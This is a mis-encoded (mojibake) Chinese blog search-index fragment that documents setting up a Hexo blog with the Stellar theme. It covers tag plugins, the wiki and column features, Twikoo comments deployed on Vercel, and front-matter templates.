å¹¶å‘å¸ƒä¸Šçº¿æ¥è‡ª2025å¹´çš„å¤ç›˜ï¼šå·²ã€ŠåŸºæœ¬ã€‹å®ç°ç›®æ ‡ &#123;% emoji tieba æ»‘ç¨½ %&#125;&lt;!-- okr kr1 percent:1 --&gt;é‡æ„ tag-plugins å’Œ wiki ç³»ç»Ÿ- å½“ &#123;% mark KR %&#125; è¿›åº¦ä¸º 100% æ—¶ï¼Œæ ‡ç­¾é»˜è®¤æ˜¾ç¤ºä¸º &#123;% mark color:green å·²å®Œæˆ %&#125;- å½“ &#123;% mark KR %&#125; æœªè®¾ç½®è¿›åº¦æ—¶ï¼Œé»˜è®¤ä¸º &#123;% mark 0% %&#125;- å½“ &#123;% mark O %&#125; æœªè®¾ç½®è¿›åº¦æ—¶ï¼Œåˆ™æ˜¾ç¤ºæ‰€æœ‰ &#123;% mark KR %&#125; è¿›åº¦å¹³å‡å€¼&lt;!-- okr kr2 percent:0.9 status:off_track --&gt;å®Œæˆä¸»è¦é¡µé¢è®¾è®¡ç¨¿&#123;% tabs align:left %&#125;&lt;!-- tab å°æç¤º1 --&gt;æ‚¨å¯ä»¥åœ¨ _config.yml æ–‡ä»¶ä¸­ä¿®æ”¹æ ‡ç­¾çš„é¢œè‰²å’Œæ–‡æ¡ˆ&lt;!-- tab å°æç¤º2 --&gt;æ‚¨å¯ä»¥åœ¨ _config.yml æ–‡ä»¶ä¸­å¢åŠ ä»»æ„çš„æ ‡ç­¾é…ç½®&#123;% endtabs %&#125;&lt;!-- okr kr3 percent:-0.12 status:unfinished --&gt;å®Œæˆå‰ç½®å‡†å¤‡å·¥ä½œï¼ˆå¦‚æœä½ çŸ¥é“ç­”æ¡ˆï¼Œè¯·åœ¨ç•™è¨€åŒºå¸®å¸®æˆ‘ï¼ğŸ¥¹ï¼‰&#123;% checkbox åœ¨å’¸æ°´å’Œæµ·æ»©ä¹‹é—´æ‰¾ä¸€äº©åœ° %&#125;&#123;% checkbox æ±‚å‡ºåœ†å‘¨ç‡å15ä½ %&#125;&#123;% checkbox æ‰¾å‡ºå®‡å®™çš„ç»ˆæé€»è¾‘ %&#125;&#123;% checkbox å»åœ°ç‹±é‡Œèµ°ä¸¤æ­¥ %&#125;&lt;!-- okr kr-4 status:at_risk --&gt;å¼€å‘ã€æµ‹è¯•å’Œå‘å¸ƒ&#123;% image /assets/wiki/stellar/icon.svg height:64px æ”¯æŒåµŒå¥—æ’å…¥å›¾ç‰‡ç­‰å…¶å®ƒç®€å•ç»„ä»¶ %&#125;&#123;% endokr %&#125; tabsåˆ†æ å®¹å™¨ è¿™ä¸ªæ ‡ç­¾ç§»æ¤è‡ª NexT ä¸»é¢˜ï¼Œä½†åšäº†ä»¥ä¸‹ä¿®æ”¹ï¼š æ”¯æŒè®¾ç½® align:center æ¥ä½¿å†…å®¹å±…ä¸­ è®¾ç½®é»˜è®¤æ¿€æ´»çš„æ ‡ç­¾æ–¹å¼ä¸º active:1 è€Œé , 1ï¼ˆä½¿ç”¨é»˜è®¤æ ¼å¼é™ä½å­¦ä¹ æˆæœ¬ï¼Œä¸”æ˜¾å¼å£°æ˜å¯è¯»æ€§æ›´å¼ºï¼‰ ä¸éœ€è¦ &lt;!-- endtab --&gt; æ¥ä½œä¸ºç»“æŸæ ‡è¯†ï¼ˆå› ä¸º Stellar ä¼šè‡ªåŠ¨åˆ¤æ–­ï¼‰ ä¸éœ€è¦ tabs id æ¥ä¿è¯å”¯ä¸€æ€§ï¼ˆå› ä¸º Stellar ä¼šè®¾ç½®å”¯ä¸€æ ‡è¯†ï¼‰ ä¸æ”¯æŒ @icon æ–¹å¼è®¾ç½®å›¾æ ‡ï¼ˆå› ä¸º Stellar ä¸å†å†…ç½® fontawesome å›¾æ ‡åº“ï¼‰ è½®å»“æ ·å¼ç®€åŒ–ï¼Œå¯ä»¥æ­é…å…¶å®ƒå®¹å™¨ç±»æ ‡ç­¾åµŒå¥—ä½¿ç”¨ã€‚ æ•ˆæœå†™æ³•å›¾ç‰‡ä»£ç å—è¡¨æ ¼12let x = 123print(&quot;hello world&quot;) a b c a1 b1 c1 a2 b2 c2 1234567891011121314151617181920&#123;% tabs active:1 align:center %&#125;&lt;!-- tab å›¾ç‰‡ --&gt;&#123;% image /assets/wiki/stellar/photos/hello@1x.png width:300px %&#125;&lt;!-- tab ä»£ç å— --&gt;```swiftlet x = 123print(&quot;hello world&quot;)```&lt;!-- tab è¡¨æ ¼ --&gt;| a | b | c || ---- | ---- | ---- || a1 | b1 | c1 || a2 | b2 | c2 |&#123;% endtabs %&#125;"},{"title":"è§£è¯»Stellarä¸»é¢˜åŠŸèƒ½","path":"/wiki/stellar/è§£è¯»Stellarä¸»é¢˜åŠŸèƒ½.html","content":"è¿™ç¯‡æ–‡ç« å¯¹Stellarä¸»é¢˜çš„ç‰¹è‰²åŠŸèƒ½è¿›è¡Œè§£è¯»ï¼Œå¹¶æŒ‡æ˜æœ¬åšå®¢ä½¿ç”¨ç”¨é€”ã€‚ postï¼ŒWikiï¼Œä¸“æ  post å¤§éƒ¨åˆ†åšå®¢éƒ½æ˜¯postï¼Œå°±æ˜¯æ–‡ç« ã€‚ Wiki Stellarç‹¬åˆ›äº†å…¶å®ƒHexoä¸»é¢˜æ‰€æ²¡æœ‰çš„Wikiæ–‡æ¡£ç³»ç»Ÿï¼ˆå¦ä¸€ä¸ªåšå®¢ä¸»é¢˜Volantisä¹Ÿæœ‰wikiï¼ŒåŒä¸€ä¸ªå¼€å‘è€…ç§»æ¤çš„ï¼‰ã€‚åœ¨wikiçš„é¡¹ç›®ä¸­ï¼Œå¯ä»¥ç”Ÿæˆä¸€ä¸ªç›®å½•æ ‘ï¼Œè¿˜å¯ä»¥æ‰‹åŠ¨æŒ‡å®šé¡ºåºã€æ ‡é¢˜ã€åˆ†ç»„ï¼Œè€Œéä¾èµ–æ–‡ä»¶è·¯å¾„ã€æ–‡ä»¶åæ¥æ’åºå’Œæ˜¾ç¤ºã€‚ è€ç‰ˆwikiå’Œæ–°ç‰ˆwikiå¯¹æ¯”åˆ†ç±»è€ç‰ˆwikiç”¨Setionsçš„æ•°å­—ä½œä¸ºåˆ†ç±»åŒºé—´ï¼Œå½“wikiçš„ä¸€ä¸ªprojectä¸‹æ–‡ç« è¾ƒå¤šæ—¶å¯èƒ½ä¼šå‡ºç°é‡æ–°å¯¹front-matterä¸­orderå­—æ®µé‡æ–°ç¼–å·çš„æƒ…å†µæ–°ç‰ˆç›´æ¥å°±æ˜¯ç›´æ¥åœ¨project.ymlé‡Œtocå­—æ®µçš„-â€˜mdæ–‡ä»¶åâ€™ï¼Œ-çš„é¡ºåºå°±æ˜¯æ–‡ç« æ’åˆ—é¡ºåºæ–°ç‰ˆwikiéœ€è¦åœ¨\\source_data\\wiki.ymlä¸­å°†é¡¹ç›®ã€Œä¸Šæ¶ã€ï¼Œä¸ä¸Šæ¶åœ¨wikié¡µé¢å°±ä¸æ˜¾ç¤ºï¼ˆä½†å®é™…ä¸Šå¯ä»¥é€šè¿‡æ‰‹åŠ¨è¾“URLè®¿é—®åˆ°ï¼‰ï¼Œç›¸å½“äºwikiå¤šäº†è‰ç¨¿åŠŸèƒ½ï¼Œä¸ä¸Šæ¶ï¼ˆwikié¡µé¢ä¸æ˜¾ç¤ºï¼‰ï¼Œå®é™…é¡µé¢è¿˜æ˜¯æ¸²æŸ“äº†æˆhtmläº†å°ç»“ï¼šä¸ªäººè§‰å¾—ï¼Œ1.20.0ç‰ˆä»¥ä¸Šçš„wikiä¼šæ›´æ–¹ä¾¿äº›ï¼Œå»ºè®®ä½¿ç”¨1.20.0ç‰ˆä»¥ä¸Šçš„wiki ä¸“æ  Stellar1.25.0ç‰ˆæœ¬åæ–°å¢äº†ä¸“æ åŠŸèƒ½ã€‚å¼€å‘è€…xaoxuuçš„å»ºè®®æ˜¯ï¼šã€Œè¯é¢˜/ä¸“æ ã€ä½œä¸ºã€Œåˆ†ç±»ã€å’Œã€Œæ ‡ç­¾ã€ä¹‹å¤–å¯¹åˆ†ç« æ£€ç´¢çš„ä¸€ä¸ªè¡¥å……ç»´åº¦ã€‚ ä¸ªäººä½¿ç”¨ åŠŸèƒ½ Post Wiki ä¸“æ  å®˜æ–¹å»ºè®®ç”¨é€” æ™®é€šçš„æ–‡ç«  wikiçŸ¥è¯†åº“/äº§å“æ–‡æ¡£ åŒä¸€è¯é¢˜ä¸‹çš„å¤šç¯‡æ–‡ç«  mdæ–‡ç« æ”¾ç½®è·¯å¾„ _postæ–‡ä»¶å¤¹ä¸‹ wiki/project/ä¸‹ _postæ–‡ä»¶å¤¹ä¸‹ æ‰‹åŠ¨æ’åº âŒï¼Œå¯ä»¥é€šè¿‡ç½®é¡¶é¡ºåºã€å‘å¸ƒæ—¶é—´æ¥è°ƒæ•´ï¼Œä½†æ²¡é‚£ä¹ˆæ–¹ä¾¿ âœ”ï¸ âŒ toc-æ–‡ç« åˆ†ç»„ âŒ âœ”ï¸ âŒ æ˜¯å¦æ”¯æŒæ ‡ç­¾æ£€ç´¢ âœ”ï¸ âœ”ï¸å¯¹é¡¹ç›®çš„æ ‡ç­¾æ£€ç´¢ âœ”ï¸ æœ¬è´¨ æ™®é€šçš„æ–‡ç«  å½’å±åœ¨åŒä¸€projectçš„æ–‡ç«  ä¹Ÿæ˜¯postï¼›å¯¹postæ–‡ç« æ£€ç´¢çš„è¡¥å……ç»´åº¦ ç½‘é¡µæ˜¾ç¤ºé¡µé¢ Blogé¡µé¢ wikié¡µé¢ Blogé¡µé¢çš„ä¸“æ tag æ ¹æ®postã€wikiã€ä¸“æ çš„ç‰¹ç‚¹ï¼Œå¾—å‡ºä¿ºä½¿ç”¨çš„ç”¨é€” postï¼š é›¶æ•£æ–‡ç«  wikiï¼š çŸ¥è¯†åº“ æœ‰å…ˆåé¡ºåºï¼Œå¼ºè”ç³»çš„æ–‡ç« é›†åˆ èƒ½è¿›è¡Œæ˜æ˜¾çš„åˆ†ç±» å±•ç¤ºä»·å€¼å¼±çš„æ–‡ç« é›†åˆï¼ˆå› ä¸ºä¸“æ æ–‡ç« ä¹Ÿä¼šå‡ºç°åœ¨postï¼Œå¦‚æœpostå¤„é«˜ä»·å€¼æ–‡ç« å°‘æ˜¾å¾—æ•´ä½“è´¨é‡å·®ï¼‰ ä¸“æ ï¼š éš¶å±äºåŒä¸€è¯é¢˜ï¼Œç¦»æ•£çš„æ— å…ˆåé¡ºåºçš„æ–‡ç« é›†åˆ ä¸ä¾¿è¿›è¡Œåˆ†ç±»çš„æ–‡ç« é›†åˆ æ–‡ç« ç»“åˆå¼„æˆä¸“æ è¿˜æ˜¯Wikiï¼Œæ˜¯ç»¼åˆè€ƒè™‘æ’åºã€å±•ç¤ºä»·å€¼ã€åˆ†ç±»ç­‰å› ç´ ï¼Œç•Œé¢ä¹Ÿæ²¡åˆ’å¾—é‚£ä¹ˆæ¸…æ™°ï¼Œæš‚ä¸”è¿™ä¹ˆåˆ† æ ‡ç­¾ç»„ä»¶è¯­æ³• ä¹‹å‰ä½¿ç”¨butterflyä¸»é¢˜åšå®¢ï¼Œè¿Ÿè¿Ÿæ²¡æ¢ä¸»é¢˜çš„åŸå› æ˜¯æ ‡ç­¾ç»„ä»¶è¯­æ³•å®åœ¨å¤ªå¥½ç”¨äº†ï¼Œèƒ½ä¸ºæ–‡ç« å†…å®¹è¡¨è¾¾å±•ç¤ºæ·»è‰²è®¸å¤š è¡¨è¾¾ç±»æ ‡ç­¾ç»„ä»¶ï¼ˆ19+ä¸ªï¼‰ å®¹å™¨ç±»æ ‡ç­¾ç»„ä»¶ï¼ˆ11ä¸ªï¼‰"},{"title":"é…ç½®å’Œæ”¹åŠ¨è®°å½•","path":"/wiki/stellar/é…ç½®å’Œæ”¹åŠ¨è®°å½•.html","content":"è¿™ç¯‡æ–‡ç« è®°å½•å¯¹Stellarä¸»é¢˜çš„æ”¹åŠ¨ï¼ŒåŒ…æ‹¬ï¼šé…ç½®é¡¹ä¿¡æ¯çš„è®°å½•ï¼Œä¸æ¶‰åŠæºä»£ç çš„è°ƒæ•´å’Œæºä»£ç ä¿®æ”¹ã€‚ é…ç½®è®°å½• _config.yml ä¿®æ”¹äº†Siteä¿¡æ¯ï¼ŒURLæ”¹åŠ¨ï¼ˆä¸ºäº†è®¾ç½®postæ–‡ç« æ–‡ç« æ°¸ä¹…é“¾æ¥ï¼‰ _config.stellar.yml æ”¹ä¸‹menu(ä¾§è¾¹æ ä¸»åŠŸèƒ½å¯¼èˆªèœå•)ï¼ŒFooterï¼Œ _config.stellar.yml123456789# ä¾§è¾¹æ ä¸»åŠŸèƒ½å¯¼èˆªèœå•# è‡ªå·±å¯ä»¥å¢åŠ ä»»æ„çš„é”®å€¼å¯¹# é”®ï¼šå°±æ˜¯ menu_idï¼Œåé¢éœ€è¦ç”¨åˆ°# å€¼ï¼šå°±æ˜¯æ˜¾ç¤ºçš„ md é“¾æ¥ï¼Œæ–¹æ‹¬å·å†…æ”¯æŒæ–‡å­—å’Œå›¾ç‰‡æ ‡ç­¾menu: post: &#x27;[btn.blog](/)&#x27; wiki: &#x27;[btn.wiki](/wiki/)&#x27; friends: &#x27;[å‹é“¾](/friends/)&#x27; about: &#x27;[å…³äº](/about/)&#x27; site_tree ä¿®æ”¹äº†pageçš„sidebarï¼Œä¸ºäº†è®©abouté¡µé¢ä¸æ˜¾ç¤ºtoc åç»­è¦æ–°å¢pageçš„è¯ï¼Œè¿™é‡Œéœ€è¦åšä¿®æ”¹ ï¼ˆè‡ªå·±æ–°å¢ä¸€ä¸ªaboutpage+sidebarï¼Œå‘ç°ä¸ç”Ÿæ•ˆï¼‰ 1234567######## Main ######### ç«™ç‚¹ä¸»ç»“æ„æ ‘site_tree: # å…¶å®ƒè‡ªå®šä¹‰é¡µé¢é…ç½® layout: page page: # sidebar: toc, search sidebar: search è¯„è®ºç³»ç»Ÿ éƒ¨ç½²Twikoo åšå®¢è¯„è®ºç³»ç»Ÿå¯¹æ¯” æœ¬ç«™é‡‡ç”¨MongoDB+vercelæ–¹å¼éƒ¨ç½²çš„Twikooè¯„è®ºç³»ç»Ÿã€‚ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ Twikooæ–‡æ¡£ ã€Twikoo Vercel éƒ¨ç½²æ•™ç¨‹ã€‘-Bç«™ å¿˜è®°è¯„è®ºåå°ç®¡ç†å¯†ç ï¼Œè§£å†³åŠæ³•è§Bç«™è¿™ä¸ªè§†é¢‘çš„è¯„è®ºåŒº verceléƒ¨ç½²twikooåè¯„è®ºæ”¶ä¸åˆ°é€šçŸ¥é‚®ä»¶é—®é¢˜è§£å†³æ–¹æ³• Vercel Authenticationè®¾ç½®ä¸ºDisabledæ˜¯ä¸ºäº†èƒ½ç”¨é‚®ä»¶é€šçŸ¥åŠŸèƒ½ å¤‡æ³¨ï¼š æ³¨å†Œvercelåè¦æ‰‹æœºæ¥éªŒè¯ç ï¼Œæ”¯æŒ+86çš„æ¥ å¡«å…¥MongoDBè¿æ¥å­—æ®µé‡æ–°éƒ¨ç½²åï¼Œvercelç»™äº†ä¸‰ä¸ªåŸŸåï¼Œéƒ½å¯ä»¥ åŠ ä¸Šhttps://åä½œä¸ºenvID _config.stellar.yml12345678910######## Comments ########comments: service: twikoo # beaudar, utterances, giscus, twikoo, waline, artalk # Twikoo # https://twikoo.js.org/ twikoo: js: https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js # å»ºè®®é”å®šç‰ˆæœ¬ envId: https://[ä»vercelä¸Šèµ‹å€¼çš„é‚£ä¸ªdomain] # vercelå‡½æ•° æœªæ¥å¯èƒ½ä¼šè§£å†³ï¼Œè¦ç”¨åˆ°çš„ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ ã€Hexoåšå®¢ã€‘Twikooè¯„è®ºç³»ç»Ÿçš„å…è´¹éƒ¨ç½²(äº‘å‡½æ•°é‡‡ç”¨Vercelæ–¹å¼) vercelç»‘å®šåŸŸåå‚è€ƒ ä½¿ç”¨Verceléƒ¨ç½²Twikooå¹¶è§£å†³è¢«å¢™çš„é—®é¢˜ è§£å†³Vercelè¢«å¢™å¯¼è‡´Twikooæ— æ³•è¯„è®ºçš„é—®é¢˜ï¼šåœ¨Vercelæ·»åŠ å­åŸŸå å›½å†…ç”¨æˆ·æ— æ³•è¯„è®ºï¼Œé€šè¿‡æ·»åŠ å­åŸŸåè§£å†³ Twikooåå°é…ç½® è®©è¯„è®ºæ”¯æŒå›¾ç‰‡ è¿›å…¥Twikooåå°åæœ‰é…ç½®å›¾åºŠçš„å‚æ•°ï¼Œç›®å‰è¿˜æ²¡é…ç½® é€šè¿‡Verceléƒ¨ç½²çš„Twikooä¸èƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œè¿˜éœ€è¦è‡ªå·±é…ç½®å›¾åºŠï¼ˆä¸”æ”¯æŒçš„å›¾åºŠä¹Ÿä¸å¤šï¼‰ï¼Œè®¿é—®é€Ÿåº¦å’Œæµç•…æ€§ä¹Ÿä¸€èˆ¬ã€‚ å¼€å¯è¯„è®ºé‚®ä»¶æé†’ twikoo è¯„è®ºç³»ç»ŸåŠé‚®ä»¶é€šçŸ¥é…ç½® front-matteræ¨¡æ¿ å‚è€ƒï¼šç¼–å†™æ–‡ç« ä»¥åŠç‹¬ç«‹é¡µé¢ åšå®¢æ ¹ç›®å½•\\scaffolds\\æ–‡ä»¶å¤¹ä¸‹æ”¾ç½®çš„æ˜¯mdæ¨¡æ¿ï¼Œä¿ºçš„é…ç½®å¦‚ä¸‹ï¼š \\scaffolds\\post.md1234567891011---title: &#123;&#123; title &#125;&#125;description: tags: []categories: []cover: banner: typora-root-url: ../date: &#123;&#123; date &#125;&#125;updated: &#123;&#123; date &#125;&#125;--- æœªæ¥å¯èƒ½æœ‰ç”¨çš„å­—æ®µ1234567---poster: # æµ·æŠ¥ï¼ˆå¯é€‰ï¼Œå…¨å›¾å°é¢å¡ç‰‡ï¼‰ topic: æ ‡é¢˜ä¸Šæ–¹çš„å°å­— # å¯é€‰ headline: å¤§æ ‡é¢˜ # å¿…é€‰ caption: æ ‡é¢˜ä¸‹æ–¹çš„å°å­— # å¯é€‰ color: æ ‡é¢˜é¢œè‰² # å¯é€‰--- å› ä¸ºå•ç‹¬çš„pageç”¨å¾—å°‘ï¼Œå°±å°†page.mdåšä¸ºåœ¨wiki-projectä¸‹çš„mdæ¨¡æ¿ \\scaffolds\\page.md12345678---layout: wiki # ä½¿ç”¨wikiå¸ƒå±€æ¨¡æ¿wiki: stellar #è¿™æ˜¯é¡¹ç›®åï¼Œç”Ÿæˆåéœ€è¦ä¿®æ”¹title: &#123;&#123; title &#125;&#125;typora-root-url: ../date: &#123;&#123; date &#125;&#125;updated: &#123;&#123; date &#125;&#125;--- å¦‚æœéœ€è¦æ–°å»ºpageï¼Œæ‰‹å»ºmdï¼Œfront-matteræ”¹ä¸ºï¼š ç‹¬ç«‹é¡µé¢.md123456---menu_id: more # ç”Ÿæˆåéœ€è¦ä¿®æ”¹title: å…³äºdate: &#123;&#123; date &#125;&#125;updated: &#123;&#123; date &#125;&#125;--- ç‹¬ç«‹é¡µé¢ aboutçš„index.mdçš„front-matterä¸­menu_idç”¨äºåœ¨å¯¼èˆªæ é«˜äº®ï¼Œmenu_idå’Œ_config.stellar.ymlæ–‡ä»¶ä¸­çš„menuä¸‹çš„å­—æ®µå¯¹åº” å‚è€ƒï¼šhttps://xaoxuu.com/wiki/stellar/pages/#æ›´å¤šçš„ç‹¬ç«‹é¡µé¢ index.md123---menu_id: about--- wiki æ–‡ä»¶ç»„ç»‡ stellarä¸å…¶ä»–ä¸»é¢˜åšå®¢ä¸åŒçš„æ˜¯ï¼Œé¢å¤–å…·æœ‰wikiä¸€æ ã€‚æ‰€ä»¥å†™ä½œè€…çš„mdæ–‡ç« å¯ä»¥æ”¾åˆ°_postæ–‡ä»¶å¤¹æˆ–wiki/ä¸‹ã€‚ ä¿ºçœ‹äº†å¼€å‘è€…ä»¥åŠä¸€äº›ä½¿ç”¨Stellarä¸»é¢˜çš„äººï¼Œwiki/ä¸‹çš„æ–‡ä»¶ç»„ç»‡éƒ½å¦‚å›¾ï¼š 1234567891011121314151617181920wiki:. â”‚ index.md â”‚ â”œâ”€project1 â”‚ â”‚ index.md â”‚ â”‚ â”‚ â”œâ”€ç« èŠ‚1 â”‚ â”‚ index.md â”‚ â”‚ â”‚ â””â”€ç« èŠ‚2 â”‚ index.md â”‚ â””â”€project2 â”‚ index.md â”‚ â”œâ”€ç« èŠ‚1 â”‚ index.md â”‚ â””â”€ç« èŠ‚2 index.md åœ¨index.mdä¸­æ”¾å…¥æ­£æ–‡ï¼Œä¸”front matteræŒ‡å‡ºwikiæ˜¯å“ªä¸ªprojectã€‚ ç»å°è¯•ï¼Œæˆ‘å‘ç°ï¼š projecté‡Œå¦‚æœæ²¡æœ‰index.mdæ˜¯æ²¡æœ‰å…³ç³»çš„ æ˜¯å¦æœ‰ç« èŠ‚1ã€ç« èŠ‚2è¿™ä¸ªæ–‡ä»¶å¤¹ä¹Ÿæ˜¯æ²¡å…³ç³»çš„ã€‚ åªè¦mdçš„front matterè¦æŒ‡å‡ºwikiæ˜¯éš¶å±äºå“ªä¸ªprojectå³å¯ã€‚ å› æ­¤ï¼Œè€ƒè™‘ç§»æ¤æ€§+æœ¬åœ°å›¾ç‰‡å­˜æ”¾å½¢å¼ï¼Œæˆ‘å°†wikiä¸­çš„æ‰€æœ‰mdæ–‡ä»¶éƒ½ç»„ç»‡å¦‚ä¸‹ï¼š 12345678wiki:. â”œâ”€project1 â”‚ æ–‡ç« 1.md â”‚ æ–‡ç« 2.md â”‚ â””â”€project2 æ–‡ç« 1.md æ–‡ç« 2.md é…ç½®å¹¶ä½¿ç”¨ 1.19.0ç‰ˆæœ¬ä»¥å‰ï¼Œå’Œï¼Œ1.20.0ç‰ˆæœ¬ä»¥åçš„wikiæ–¹å¼ä¸åŒã€‚1.26.0ç‰ˆæœ¬ä»¥åwikié…ç½®å­—æ®µæœ‰å˜åŒ–ï¼špathæ”¹ä¸ºbase_dirï¼Œsidebaråˆ†leftbarå’Œrightbarã€‚ï¼ˆä¸å®Œå…¨å‡†ç¡®ï¼‰ 1.19.0ç‰ˆæœ¬ä»¥å‰[1.20.0ï¼Œ1.25.0]å‚è€ƒï¼šhttps://sumorio.com/wiki/Hexo/303filesystem-sidebar.html æ–‡ä»¶æ ‘ç»“æ„1234567891011source:. â”œâ”€wiki â”‚ â””â”€stellar â”‚ Stellaræ­å»ºå’Œéƒ¨ç½².md â”‚ é…ç½®å’Œæ”¹åŠ¨è®°å½•.md â”‚ â”œâ”€_data â”‚ projects.yml â”‚ â””â”€_post hello-world.md source/_data/projects.ymlæ–‡ä»¶é‡Œæ˜¯æ‰€æœ‰é¡¹ç›®çš„æè¿°ä¿¡æ¯ é¡¹ç›®IDåéœ€è¦å”¯ä¸€ Sectionsæ˜¯åˆ†ç±»å’Œå¯¹åº”çš„åŒºé—´ã€‚åœ¨mdæ–‡ç« ä¸­å¯ä»¥é€šè¿‡åŒºé—´çš„æ•°å­—è®¾ç½®æ–‡ç« åˆ†åˆ°å“ªä¸ªç±»åˆ«ä¸­ \\source\\_data\\projects.yml12345678910111213141516171819202122######## stellar ########stellar: # é¡¹ç›®IDå name: Stellar title: Stellar - å»ºç«™è®°å½• #subtitle: &#x27;æ¯ä¸ªäººçš„ç‹¬ç«‹åšå®¢ | Designed by xaoxuu&#x27; tags: å…¶ä»– cover: false #logo: #src: /assets/wiki/stellar/icon.svg #small: 112px #large: 240px #description: Stellar æ˜¯ä¸€ä¸ªå†…ç½® wiki ç³»ç»Ÿçš„ hexo ä¸»é¢˜ï¼Œé€‚åˆç»¼åˆå‹ç«™ç‚¹ä½¿ç”¨ã€‚åŒæ—¶ä¹Ÿæ‹¥æœ‰ç®€çº¦è€Œç²¾ç¾çš„è§†è§‰è®¾è®¡å’Œä¸°å¯Œçš„æ ‡ç­¾æ’ä»¶ï¼Œå¸®åŠ©æ‚¨ç®€å•ä»å®¹åœ°åº”å¯¹å„ç§åœºåˆã€‚ description: è®°å½•Stellarä¸»é¢˜åšå®¢æ­å»ºæ—¶çš„é…ç½®ï¼Œæ”¹åŠ¨å’Œå¸¸ç”¨å‘½ä»¤ã€‚ #repo: xaoxuu/hexo-theme-stellar #comment_title: &#x27;è¯„è®ºåŒºä»…ä¾›äº¤æµï¼Œæœ‰é—®é¢˜è¯·æ [issue](https://github.com/xaoxuu/hexo-theme-stellar/issues) åé¦ˆã€‚&#x27; #giscus: #data-repo: xaoxuu/hexo-theme-stellar #data-mapping: number #data-term: 226 sections: &#x27;Hexo&#x27;: [0, 10] &#x27;Stellar&#x27;: [11, 20] mdæ–‡ä»¶ mdæ–‡ä»¶æ”¾åœ¨source/wiki/é¡¹ç›®IDä¸‹ã€‚ä»¥stellaré¡¹ç›®çš„æ–‡æ¡£ä¸ºä¾‹ï¼Œæ”¾åœ¨source/wiki/stellarä¸‹ã€‚ mdçš„front-matter layoutçš„å€¼å›ºå®šä¸ºwikiï¼Œè¡¨ç¤ºç”¨wikiæ¸²æŸ“æ­¤md wikiæŒ‡æ˜é¡¹ç›®ID titleï¼šæ–‡ç« æ ‡é¢˜ orderï¼šå½’å±åŒºé—´ï¼Œåˆ†åˆ°å“ªä¸ªç±»åˆ«ã€‚3ï¼Œåˆ†åˆ°Hexoç±»åˆ«ä¸­ å¯é€‰å­—æ®µ 1234567---breadcrumb: false# è¡¨ç¤ºæœ¬é¡µé¢ä¸æ˜¾ç¤ºé¡¶éƒ¨å¯¼èˆªï¼Œå¦‚æœä½ éœ€è¦æ˜¾ç¤ºçš„è¯ï¼ŒæŠŠè¿™ä¸€è¡Œåˆ é™¤å³å¯comments: false#è¡¨ç¤ºæœ¬é¡µé¢ä¸å¯ç”¨è¯„è®ºç‰ˆå—ï¼Œéœ€è¦å¯ç”¨è¯„è®ºæ¿å—çš„è¯æŠŠå€¼æ”¹æˆtrue--- 123456---layout: wikiwiki: stellartitle: å¤‡ä»½ä¸å‡çº§order: 3--- å‚è€ƒï¼šhttps://blog.bxzdyg.cn/p/ä½¿ç”¨Hexoå’ŒStellaræ­å»ºä¸ªäººåšå®¢ç½‘ç«™/#1-19-0-1 æ–‡ä»¶æ ‘ç»“æ„1234567891011121314source: â”œâ”€wiki â”‚ â””â”€stellar â”‚ Stellaræ­å»ºå’Œéƒ¨ç½².md â”‚ é…ç½®å’Œæ”¹åŠ¨è®°å½•.md â”‚ â”œâ”€_data â”‚ â”‚ wiki.yml â”‚ â”‚ â”‚ â””â”€wiki â”‚ stellar.yml â”‚ â””â”€_posts hello-world.md åˆ›å»ºé¡¹ç›®æè¿°æ–‡ä»¶ \\source\\_data\\wiki\\ä¸‹çš„xx.ymlæ˜¯å„ä¸ªé¡¹ç›®çš„æè¿°ä¿¡æ¯æ–‡ä»¶ã€‚xx.ymlä¸­çš„å†…å®¹æ˜¯é¡¹ç›®æè¿°ä¿¡æ¯ï¼Œæ–‡ä»¶åxxæ˜¯é¡¹ç›®çš„idã€‚ä»¥ stellaré¡¹ç›®ä¸ºä¾‹ï¼š \\source\\_data\\wiki\\stellar.yml1234567891011121314151617181920212223242526272829name: Stellar # è¿›å…¥wikiæ–‡ç« å·¦ä¸Šè§’çš„åå­—title: Stellar - å»ºç«™è®°å½•# subtitle: &#x27;å¾ˆå¼€å¿ƒçš„å­¦äº† | ç»“æœåˆå¤šäº†ä¸€ä¸ªå­¦è¿‡è€Œä¸ä¼šçš„æŠ€æœ¯&#x27; # é¡¹ç›®ä¸­å’Œä¸»é¡µç›¸ä¼¼çš„ä¸¤ä¸ªå‰¯æ ‡é¢˜tags: å…¶ä»–# icon: /assets/wiki/stellar/icon.svg # å°é¢é¡µå¤§å›¾# cover: /assets/wiki/stellar/icon.svg # åˆ—è¡¨é¡µå›¾æ ‡# coverpage: [logo, description]coverpage: false # é»˜è®¤æ˜¯ truedescription: Stellarä¸»é¢˜åšå®¢å»ºç«™è®°å½•ï¼ŒåŒ…æ‹¬ï¼šæ­å»ºã€é…ç½®ã€éƒ¨ç½²ã€å¤‡ä»½ã€å‡çº§ï¼Œç‰¹è‰²åŠŸèƒ½ä¸ªäººç†è§£ï¼Œè¿˜æœ‰æ—¥å¸¸å·¥ä½œæµï¼Œæ ‡ç­¾ç»„ä»¶è¯­æ³•è®°å½•ã€‚# repo: xaoxuu/hexo-theme-stellarsidebar: - search: override: search filter: /wiki/stellar/ placeholder: &#x27;åœ¨/wiki/stellar/ä¸­æœç´¢...&#x27; - toc # - timeline_stellar_releases - related# comment_title: &#x27;è¯„è®ºåŒºä»…ä¾›äº¤æµï¼Œæœ‰é—®é¢˜è¯·æ [issue](https://github.com/xaoxuu/hexo-theme-stellar/issues) åé¦ˆã€‚&#x27;# comments:# service: giscus# giscus:# data-repo: xaoxuu/hexo-theme-stellar# data-mapping: number# data-term: 226path: /wiki/stellar/toc: - &#x27;Stellaræ­å»ºå’Œéƒ¨ç½²&#x27; - &#x27;é…ç½®å’Œæ”¹åŠ¨è®°å½•&#x27; è®¾ç½®å¸ƒå±€æ¨¡æ¿å’Œé¡¹ç›®åç§° åœ¨mdæ–‡æ¡£çš„front-matteréƒ¨åˆ†æŒ‡å®šæ‰€å±çš„é¡¹ç›®idï¼ˆä¸Šä¸€æ­¥åˆ›å»ºçš„æ–‡ä»¶åid.ymlï¼‰ wiki: stellarå­—æ®µè¡¨æ˜æ­¤mdå±äºwikiçš„stellaré¡¹ç›® layoutï¼šwikiæ˜¯ä½¿ç”¨wikiæ¸²æŸ“æ­¤md 